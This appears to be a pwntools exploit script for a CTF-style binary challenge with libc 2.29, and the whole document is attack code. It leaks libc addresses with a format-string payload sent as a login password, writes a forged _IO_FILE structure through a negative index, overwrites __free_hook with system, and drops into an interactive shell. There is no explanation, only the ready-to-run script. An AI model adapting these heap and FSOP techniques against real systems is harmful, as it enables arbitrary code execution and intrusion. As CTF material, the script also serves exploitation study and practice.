from pwn import*
#context.log_level = 'DEBUG'
def menu(ch):
	p.sendlineafter('>> ',str(ch))
def adjust(index,size,content):
	menu(2)
	p.sendlineafter('the power: ',str(index))
	p.sendlineafter('size: ',str(size))
	p.sendafter('staff: ',content)
def delete(index):
	menu(3)
	p.sendlineafter('power: ',str(index))
def login():
	menu(2)
	p.sendlineafter('account :','QAQ')
	p.sendafter('password :','%p%p%pLC:%pbMUK\n')
p = process('./main')
#p = remote('182.92.203.154',15268)
libc =ELF('./libc-2.29.so')
login()
p.recvuntil('LC:')
libc_base = int(p.recv(14),16)  - 0x1EC540
log.info('LIBC:\t' + hex(libc_base))

system = libc_base + libc.sym['system']

IO_list_all = libc_base + libc.sym['_IO_list_all']
IO_str_jumps = libc_base + 0x1E6620
fake_IO_FILE  = '\x00'*0x18
fake_IO_FILE += p64(0) + p64(1)
fake_IO_FILE += p64(0) + p64(libc_base + libc.search('/bin/sh').next())
fake_IO_FILE  = fake_IO_FILE.ljust(0xD0,'\x00')
fake_IO_FILE += p64(IO_str_jumps - 8) + p64(0xFBAD2887)


adjust(-2,0,fake_IO_FILE)
p.sendline('FMYY')
menu(4)
p.sendlineafter('__free_hook',p64(system))
p.interactive()
